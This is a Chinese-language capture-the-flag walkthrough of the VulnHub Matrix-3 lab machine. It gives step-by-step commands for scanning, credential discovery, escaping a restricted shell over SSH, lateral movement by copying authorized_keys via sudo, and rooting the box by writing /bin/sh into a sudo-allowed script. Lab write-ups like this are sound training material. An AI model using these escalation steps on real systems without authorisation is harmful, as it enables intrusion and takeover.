# Matrix-3

## 环境

虚拟机平台：Oracle VM VirtualBox

攻击机：Kali（IP：192.168.56.102）

靶机：Matrix-3（IP：192.168.56.109）

下载：https://www.vulnhub.com/entry/matrix-3,326/

## Let's go

```
nmap -p- -A 192.168.56.109
```

![](./img/Matrix3-01.png)

> **审查网页发现兔子，并且提供了有用的信息**

![](./img/Matrix3-02.png)

![](./img/Matrix3-03.png)

> **由于目录太深这里我直接使用wget递归下载**

```
wget -r -l 0 http://192.168.56.109/Matrix/
tree Matrix | grep -v index.html
```

![](./img/Matrix3-04.png)

```
file secret.gz
cat secret.gz
```

![](./img/Matrix3-05.png)

![](./img/Matrix3-06.png)

> **使用用户名和密码成功登录7331端口，然而并没有发现什么信息，我们进行枚举**

```
dirb http://192.168.56.109:7331/ -u admin:passwd
```

![](./img/Matrix3-07.png)

![](./img/Matrix3-08.png)

> **发现是DOS文件，使用IDA查看得到 guest:7R1n17yN30**

![](./img/Matrix3-09.png)



> **尝试SSH登陆发现得到受限shell，因此使用-t "bash --noprofile"重新登陆**

```
ssh guest@192.168.56.109 -p 6464 -t "bash --noprofile"
```

![](./img/Matrix3-10.png)

```
sudo -l
```

![](./img/Matrix3-11.png)

```
sudo -u trinity cp authorized_keys /home/trinity/.ssh/authorized_keys
ssh trinity@127.0.0.1 -p 6464
```

![](./img/Matrix3-12.png)

```
sudo -l
```

![](./img/Matrix3-13.png)

> **然而并没有发现该文件，因此我们可以创建并执行它**

```
echo '/bin/sh' > oracle
chmod 777 oracle
sudo ./oracle
```

![](./img/Matrix3-14.png)

```
cat flag.txt
```

![](./img/Matrix3-15.png)